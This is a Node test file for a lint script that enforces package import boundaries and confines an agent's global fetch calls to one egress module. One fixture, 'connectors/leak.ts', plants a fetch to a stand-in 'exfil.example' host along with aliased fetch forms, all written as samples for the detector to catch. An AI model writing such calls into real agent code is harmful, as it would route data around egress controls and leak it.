import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { findViolations, RULES } from './check-boundaries.mjs';

const script = fileURLToPath(new URL('./check-boundaries.mjs', import.meta.url));
const dirs = [];
after(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

/** A throwaway repository holding `tree` (path -> contents); untracked files count, as in a working tree. */
function repo(tree) {
  const dir = mkdtempSync(path.join(tmpdir(), 'check-boundaries-'));
  dirs.push(dir);
  const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_')));
  execFileSync('git', ['init', '-q'], { cwd: dir, env });
  for (const [f, text] of Object.entries(tree)) {
    mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
    writeFileSync(path.join(dir, f), text);
  }
  return dir;
}

/** Run the check as a CLI in a throwaway repository. */
const run = (tree) => {
  const dir = repo(tree);
  const r = spawnSync('node', [script], { cwd: dir, encoding: 'utf8' });
  return { code: r.status, out: `${r.stdout}${r.stderr}` };
};

const only = (name) => RULES.filter((r) => r.name === name);
/** The violations of `rules` (every production rule by default) in a throwaway repository holding `tree`. */
const found = (tree, rules = RULES) => findViolations(repo(tree), rules).map((v) => `${v.rule} ${v.file}:${v.line} ${v.spec}`);

describe('check-boundaries', () => {
  it('pins the production rules: their scope, their exemption and what they ban or allow', () => {
    const shape = (r) => [r.name, r.scope.source, r.exempt?.source, (r.banned ?? []).map((b) => b.source), (r.allow ?? []).map((a) => a.source), (r.names ?? []).map((n) => n.source)];
    assert.deepEqual(RULES.map(shape), [
      ['no-fletch', '^packages\\/host(?:-cloudflare)?\\/', undefined, ['^fletch-agent(?:\\/|$)', '^create-fletch(?:\\/|$)', '(?:^|\\/)packages\\/(?:agent|create-fletch)(?:\\/|$)'], [], []],
      ['no-deep-import', '^packages\\/', undefined, ['^@qyvr\\/[^/]+\\/.'], [], []],
      ['no-cloudflare-workers', '^packages\\/host\\/', undefined, ['^cloudflare:'], [], []],
      [
        'file-vocabulary',
        '^packages\\/agent\\/src\\/',
        '^packages\\/agent\\/src\\/files\\/tools\\.ts$',
        [],
        [],
        ["\\bname\\s*:\\s*['\"`](?:file|files|fs|tree|work|dir)_\\w+['\"`]", "\\bname\\s*:\\s*['\"`]\\w+_(?:edit|grep|find)['\"`]"],
      ],
      ['file-vocabulary-workspace', '^packages\\/agent\\/src\\/', '^packages\\/agent\\/src\\/tree\\/', ['^@cloudflare\\/computer(?:\\/|$)'], [], []],
      [
        'file-vocabulary-store',
        '^packages\\/agent\\/src\\/files\\/store\\.ts$',
        undefined,
        [],
        [],
        ['^[ \\t]*(?:(?:private|public|async|static)\\s+)*(?:edit|grep|find|search|replace)\\w*\\s*[(<]', '\\b(?:edit|grep|find)\\w*\\s*[:=]\\s*(?:async\\s*)?(?:\\([^)]*\\)|\\w+)\\s*=>'],
      ],
      [
        'agent-fetch',
        '^packages\\/agent\\/src\\/',
        '^packages\\/agent\\/src\\/(?:egress\\/outbound\\.ts$|http\\/(?:page|admin-page|app\\/(?:settings|chat|shell))\\.ts$|design\\/fletch\\/prototype\\/)',
        [],
        [],
        ["(?<![\\w$.'\"`]|\\basync\\s+)\\bfetch\\s*\\((?!\\s*\\)|\\s*[\\w$]+\\s*\\??\\s*:)", '\\b(?:globalThis|self|window)\\s*\\.\\s*fetch\\b', "(?<![\\w$.'\"`?])\\bfetch(?=\\s*[,;)\\]}])"],
      ],
    ]);
    for (const r of RULES) assert.ok(typeof r.why === 'string' && r.why !== '', `${r.name} says why`);
  });

  it('exits zero on a clean tree', () => {
    const r = run({
      'packages/host/src/index.ts': 'export {};\n',
      'packages/host-cloudflare/src/index.ts': 'import { x } from "@qyvr/host";\nexport { x };\n',
      'packages/agent/src/index.ts': 'import { x } from "@qyvr/host";\nimport { y } from "@qyvr/host-cloudflare";\nexport { x, y };\n',
    });
    assert.equal(r.code, 0, r.out);
  });

  it('no-fletch: a primitive importing the app by package name or by path fails, in both primitives and every import form', () => {
    assert.deepEqual(
      found(
        {
          'packages/host/src/a.ts': 'import { a } from "fletch-agent";\nexport { a };\n',
          'packages/host/src/b.ts': 'export * from "fletch-agent/src/host.ts";\n',
          'packages/host/src/c.ts': 'const m = await import("../../agent/src/index.ts");\nexport { m };\n',
          'packages/host-cloudflare/src/d.ts': 'import type { Env } from "../../agent/src/objects/names.ts";\nexport type { Env };\n',
          'packages/host-cloudflare/src/e.ts': 'import { run } from "create-fletch";\nimport "../../create-fletch/bin.ts";\nexport { run };\n',
        },
        only('no-fletch'),
      ),
      [
        'no-fletch packages/host-cloudflare/src/d.ts:1 ../../agent/src/objects/names.ts',
        'no-fletch packages/host-cloudflare/src/e.ts:1 create-fletch',
        'no-fletch packages/host-cloudflare/src/e.ts:2 ../../create-fletch/bin.ts',
        'no-fletch packages/host/src/a.ts:1 fletch-agent',
        'no-fletch packages/host/src/b.ts:1 fletch-agent/src/host.ts',
        'no-fletch packages/host/src/c.ts:1 ../../agent/src/index.ts',
      ],
    );
  });

  it('no-fletch binds only the primitives: the agent, tests and lookalike names pass', () => {
    assert.deepEqual(
      found(
        {
          'packages/agent/src/a.ts': 'import { b } from "./b.ts";\nexport { b };\n',
          'test/workers/x.test.ts': 'import { a } from "../../packages/agent/src/a.ts";\n',
          'packages/host/src/c.ts': 'import { c } from "fletch-agentish";\nimport { d } from "./agent/d.ts";\nexport { c, d };\n',
        },
        only('no-fletch'),
      ),
      [],
    );
  });

  it('no-deep-import: a path inside a @qyvr/* package fails anywhere under packages/, the bare name passes', () => {
    assert.deepEqual(
      found(
        {
          'packages/host/src/y.ts': 'import { k } from "@qyvr/host-cloudflare/src/keys.ts";\nexport { k };\n',
          'packages/agent/src/z.ts': 'import { h } from "@qyvr/host/src/host.ts";\nimport { g } from "@qyvr/host";\nexport { g, h };\n',
        },
        only('no-deep-import'),
      ),
      ['no-deep-import packages/agent/src/z.ts:1 @qyvr/host/src/host.ts', 'no-deep-import packages/host/src/y.ts:1 @qyvr/host-cloudflare/src/keys.ts'],
    );
  });

  it('no-cloudflare-workers: a cloudflare: import under packages/host fails, in host-cloudflare and the agent it passes', () => {
    assert.deepEqual(
      found(
        {
          'packages/host/src/a.ts': 'import { DurableObject } from "cloudflare:workers";\nexport { DurableObject };\n',
          'packages/host/src/b.ts': 'const m = await import("cloudflare:email");\nexport { m };\n',
          'packages/host-cloudflare/src/c.ts': 'import { DurableObject } from "cloudflare:workers";\nexport { DurableObject };\n',
          'packages/agent/src/d.ts': 'import { DurableObject } from "cloudflare:workers";\nexport { DurableObject };\n',
        },
        only('no-cloudflare-workers'),
      ),
      ['no-cloudflare-workers packages/host/src/a.ts:1 cloudflare:workers', 'no-cloudflare-workers packages/host/src/b.ts:1 cloudflare:email'],
    );
  });

  it('reads past comments: a `}` in one hides nothing, and a commented-out import is still reported (fail-safe)', () => {
    const tree = {
      'packages/host/src/a.ts': "import { /* } */ x } from 'fletch-agent';\n",
      'packages/host/src/b.ts': "// import { x } from 'fletch-agent';\nconst glob = '**/*.md';\nimport { y } from 'create-fletch';\nconst end = '*/';\n",
    };
    assert.deepEqual(found(tree, only('no-fletch')), ['no-fletch packages/host/src/a.ts:1 fletch-agent', 'no-fletch packages/host/src/b.ts:1 fletch-agent', 'no-fletch packages/host/src/b.ts:3 create-fletch']);
  });

  it('file-vocabulary: a second file vocabulary fails, by tool name, by Workspace import and by an edit or grep in the home store', () => {
    const tree = {
      'packages/agent/src/files/r2-tools.ts': "export const t = { name: 'file_edit', kind: 'observation' };\nexport const u = { name: \"file_grep\" };\n",
      'packages/agent/src/memory/extra.ts': "const a = 1;\nexport const g = { name: 'memory_grep' };\nexport const f = { name: `fs_read` };\n",
      'packages/agent/src/chat/ws.ts': "import { Workspace } from '@cloudflare/computer';\nimport { createEditTool } from '@cloudflare/computer/tools';\n",
      'packages/agent/src/files/store.ts': "export class PersonFiles {\n  async edit(input: { path: string }) {}\n  grep(pattern: string) {}\n  private findText = (q) => q;\n  list() { return this.rows.find((r) => r.ok); }\n}\n",
    };
    assert.deepEqual(found(tree, RULES.filter((r) => r.name.startsWith('file-vocabulary'))), [
      'file-vocabulary-workspace packages/agent/src/chat/ws.ts:1 @cloudflare/computer',
      'file-vocabulary-workspace packages/agent/src/chat/ws.ts:2 @cloudflare/computer/tools',
      "file-vocabulary packages/agent/src/files/r2-tools.ts:1 name: 'file_edit'",
      'file-vocabulary packages/agent/src/files/r2-tools.ts:2 name: "file_grep"',
      'file-vocabulary-store packages/agent/src/files/store.ts:2   async edit(',
      'file-vocabulary-store packages/agent/src/files/store.ts:3   grep(',
      'file-vocabulary-store packages/agent/src/files/store.ts:4 findText = (q) =>',
      "file-vocabulary packages/agent/src/memory/extra.ts:2 name: 'memory_grep'",
      'file-vocabulary packages/agent/src/memory/extra.ts:3 name: `fs_read`',
    ]);
  });

  it('file-vocabulary: the one files module, the tree directory and other tools pass', () => {
    const tree = {
      'packages/agent/src/files/tools.ts': "export const t = [{ name: 'file_read' }, { name: 'file_edit' }, { name: 'file_grep' }, { name: 'file_find' }];\n",
      'packages/agent/src/tree/rpc.ts': "import { Workspace } from '@cloudflare/computer';\nexport class T { edit() {} grep() {} find() {} }\n",
      'packages/agent/src/memory/tools.ts': "export const m = { name: 'memory_write' };\nconst stub = 'file_read {\"path\":\"work/spill/x.txt\"}';\n",
      'packages/agent/src/files/store.ts': "export class PersonFiles {\n  async read() { return this.rows.find((r) => r.ok); }\n  async write() {}\n}\n",
      'test/m24/x.test.ts': "const t = { name: 'file_edit' };\nimport { Workspace } from '@cloudflare/computer';\n",
    };
    assert.deepEqual(found(tree, RULES.filter((r) => r.name.startsWith('file-vocabulary'))), []);
  });

  // M25.1, spec P4: the agent script's only fetch callers are the egress module and named bindings.
  it('agent-fetch: a global fetch outside egress/outbound.ts fails, called, aliased or read off globalThis, with its line', () => {
    const tree = {
      // The four sites this rule moved into egress/outbound.ts, as they stood before M25.1.
      'packages/agent/src/index.ts': "export default {\n  async fetch(request, env) {\n    keys = teamKeys(env.ACCESS_ISSUER, (url) => fetch(url), () => Date.now());\n  },\n};\n",
      'packages/agent/src/objects/vault.ts': "const deps = {\n  fetch: (url, init) => fetch(url, init),\n};\n",
      'packages/agent/src/objects/ingress.ts': "async function openSocket(url: string) {\n  const res = await fetch(url, { headers: { upgrade: 'websocket' } });\n}\n",
      'packages/agent/src/delivery/person-deps.ts': "const post = async (endpoint, init) => ({ status: (await fetch(endpoint, { method: 'POST', ...init })).status });\n",
      // New ways round the egress module: a connector, an alias, globalThis, and fetch handed on as a value.
      'packages/agent/src/connectors/leak.ts': "export const read = async (u: string) => (await fetch('https://exfil.example/' + u)).text();\nconst f = globalThis.fetch;\nconst g = self.fetch;\nrun({ get: fetch });\nconst h = [fetch];\n",
    };
    assert.deepEqual(found(tree, only('agent-fetch')), [
      'agent-fetch packages/agent/src/connectors/leak.ts:1 fetch(',
      'agent-fetch packages/agent/src/connectors/leak.ts:2 globalThis.fetch',
      'agent-fetch packages/agent/src/connectors/leak.ts:3 self.fetch',
      'agent-fetch packages/agent/src/connectors/leak.ts:4 fetch',
      'agent-fetch packages/agent/src/connectors/leak.ts:5 fetch',
      'agent-fetch packages/agent/src/delivery/person-deps.ts:1 fetch(',
      'agent-fetch packages/agent/src/index.ts:3 fetch(',
      'agent-fetch packages/agent/src/objects/ingress.ts:2 fetch(',
      'agent-fetch packages/agent/src/objects/vault.ts:2 fetch(',
    ]);
  });

  it('agent-fetch: egress/outbound.ts, a binding\'s or stub\'s fetch, a declared fetch method, prose, the pages\' browser scripts and tests pass', () => {
    const tree = {
      'packages/agent/src/egress/outbound.ts': 'export const egressNetwork = (url: string, init: RequestInit) => fetch(url, init);\n',
      'packages/agent/src/code/tool.ts': "export const client = (binding: { fetch(input: string): Promise<Response> }) => binding.fetch('https://sandbox.internal/run');\nconst d = 'No network: fetch() throws';\n",
      'packages/agent/src/objects/job.ts': "export class Job {\n  async fetch(): Promise<Response> { return env.CHAT.get(id).fetch(request); }\n}\n",
      'packages/agent/src/http/routes.ts': 'interface Dir {\n  fetch(request: Request): Promise<Response>;\n  chat(id: string): { fetch(request: Request): Promise<Response> };\n}\ntype L = Pick<Link, "fetch">;\n// fetch(url) in a comment\n',
      'packages/agent/src/http/page.ts': 'const SW = `self.addEventListener("fetch", (e) => e.respondWith(fetch(e.request)));`;\n',
      'packages/agent/src/http/app/settings.ts': 'const js = `const res = await fetch("/me");`;\n',
      'test/m25/x.test.ts': "await fetch('https://example.com/');\n",
    };
    assert.deepEqual(found(tree, only('agent-fetch')), []);
  });

  it('agent-fetch: a neighbour of the outbound module is not exempt', () => {
    assert.deepEqual(found({ 'packages/agent/src/egress/module.ts': 'export const go = (u: string) => fetch(u);\n' }, only('agent-fetch')), ['agent-fetch packages/agent/src/egress/module.ts:1 fetch(']);
  });

  it('never reads a nested Claude Code worktree', () => {
    assert.deepEqual(found({ '.claude/worktrees/x/packages/host/src/a.ts': "import { x } from 'fletch-agent';\n" }), []);
  });

  it('exits non-zero with file:line on a planted violation when run as a script, naming every rule broken', () => {
    const r = run({
      'packages/host/src/x.ts': 'import { a } from "fletch-agent";\nexport { a };\n',
      'packages/host/src/y.ts': 'import { k } from "@qyvr/host-cloudflare/src/keys.ts";\nexport { k };\n',
      'packages/agent/src/z.ts': 'export const go = (u: string) => fetch(u);\n',
    });
    assert.equal(r.code, 1);
    assert.match(r.out, /packages\/host\/src\/x\.ts:1: no-fletch: fletch-agent/);
    assert.match(r.out, /packages\/host\/src\/y\.ts:1: no-deep-import/);
    assert.match(r.out, /packages\/agent\/src\/z\.ts:1: agent-fetch/);
  });
});
